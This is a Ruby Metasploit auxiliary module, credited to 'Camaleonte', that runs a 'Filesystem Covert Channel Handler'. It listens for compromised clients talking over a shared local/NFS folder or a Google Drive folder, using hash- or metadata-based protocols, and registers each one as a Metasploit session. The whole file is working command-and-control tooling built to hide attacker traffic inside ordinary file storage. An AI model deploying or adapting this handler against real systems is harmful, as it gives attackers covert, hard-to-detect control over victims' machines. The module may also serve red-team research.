require 'msf/core'

require_relative 'filesystem_session'
require_relative 'util/mediums/linux_filesystem'
require_relative 'util/mediums/drive_filesystem'
require_relative 'util/protocols/hash_protocol'
require_relative 'util/protocols/metadata_protocol'
require_relative 'util/utils'

class MetasploitModule < Msf::Auxiliary
  def initialize(info = {})
    super(
      update_info(
        info,
        'Author' => 'Camaleonte',
        'Name' => 'Filesystem Covert Channel Handler',
        'Description' => 'Creates a listener for a filesystem based covert channel c2',
        'License' => MSF_LICENSE
      )
    )

    register_options([
      OptString.new('FILESYSTEM', [true, 'Filesystem for covert channel']),
      OptString.new('PROTOCOL', [true, 'Protocol for covert channel']),
      OptBool.new('RESET', [true, 'Reset the client count', true]),
      OptString.new('PATH', [false, 'Path to folder of covert channel']),
      OptString.new('CRED_PATH', [false, 'Path to credentials file'])
    ])
  end

  def connect_client(client)
    opts = {
      'filesystem' => datastore['FILESYSTEM'],
      'protocol' => datastore['PROTOCOL'],
      'tunnel_peer' => datastore['PATH']
    }
    sess = Msf::Sessions::FilesystemSession.new(client, opts)
    framework.sessions.register(sess)
    print_status('New Session: ' + sess.name)
  end

  def run
    print_line('Connecting to filesystem...')

    # setup the filesystem dynamically
    fs = \
      case datastore['FILESYSTEM'].downcase
      when 'linux', 'lfs', 'nfs'
        if !datastore['PATH']
          print_bad('Missing arguments!')
          return
        end
        LinuxFileSystem.new(datastore['PATH'])
      when 'drive', 'dfs', 'google'
        if !datastore['CRED_PATH'] || !datastore['PATH']
          print_bad('Missing arguments!')
          return
        end
        GoogleDriveFilesystem.new(datastore['CRED_PATH'], datastore['PATH'])
      else
        print_bad("Unknown filesystem: #{datastore['FILESYSTEM']}")
        return
      end
    # set client dynamically
    client = \
      case datastore['PROTOCOL'].downcase
      when 'hash', 'hashbased'
        HashProtocol.new(fs)
      when 'metadata', 'meta'
        MetadataProtocol.new(fs)
      else
        print_bad("Unknown protocol: #{datastore['PROTOCOL']}")
        return
      end

    print_good('Successfully connected!')

    # reset the client count if specified
    if datastore['RESET']
      fs.set_client_count(0)
    end

    # wait for connection + update user
    print_status('Currently have ' + fs.get_client_count.to_s + ' connected clients')
    print_status('Waiting for new client to connect...')
    client.wait_for_connection
    print_good('New client connected!')
    connect_client(client)
  end
end
